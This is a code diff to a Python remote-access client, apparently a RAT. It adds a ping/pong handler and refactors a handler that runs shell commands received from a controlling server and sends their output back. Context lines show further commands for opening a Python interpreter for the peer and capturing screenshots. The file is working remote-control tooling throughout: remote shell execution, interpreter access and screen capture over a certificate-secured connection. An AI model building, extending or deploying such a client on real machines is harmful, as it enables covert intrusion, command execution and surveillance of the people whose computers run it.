@@ -24,6 +24,8 @@ class Client(BaseClient):
         # Wait for a command to arrive
         command = self.read().decode()
         match command:
+            case 'PING':
+                self.ping()
             case 'SHELL':
                 self.shell()
             case 'PYTHON':
@@ -47,16 +49,16 @@ class Client(BaseClient):
             case _:
                 logging.debug('Received unrecognized command: %s', command)
 
+    def ping(self) -> None:
+        """ Respond to server ping """
+        self.write(b'PONG')
+
     def shell(self) -> None:
         """ Open a shell for peer """
         command = self.read().decode()
         logging.info('Executing shell command: %s', command)
-        process = subprocess.Popen(
-            command,
-            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-            shell=True
-        )
-        self.write(process.stdout.read() + process.stderr.read())
+        output = subprocess.run(command, shell=True, capture_output=True, check=False)
+        self.write(output.stdout + output.stderr)
 
     def interpreter(self) -> None:
         """ Open python interpreter for peer """
@@ -77,7 +79,7 @@ class Client(BaseClient):
         logging.debug('Capturing screenshot')
         try:
             data = screen.screenshot()
-        except Exception as error:
+        except RuntimeError as error:
             error_message = f'{error.__class__.__name__}: {str(error)}'
             logging.error('Error taking screenshot: %s', error_message)
             data = ('ERROR: ' + error_message).encode()
@@ -193,14 +195,11 @@ class Client(BaseClient):
             self.write(b'LOCKED')
 
 
-        
-
-
 if __name__ == '__main__':
 
     # Read certificate from file
-    with open('cert.pem', 'rb') as file:
-        cert = x509.load_pem_x509_certificate(file.read())
+    with open('cert.pem', 'rb') as cert_file:
+        cert = x509.load_pem_x509_certificate(cert_file.read())
 
     # Connect to server
     client = Client(cert)
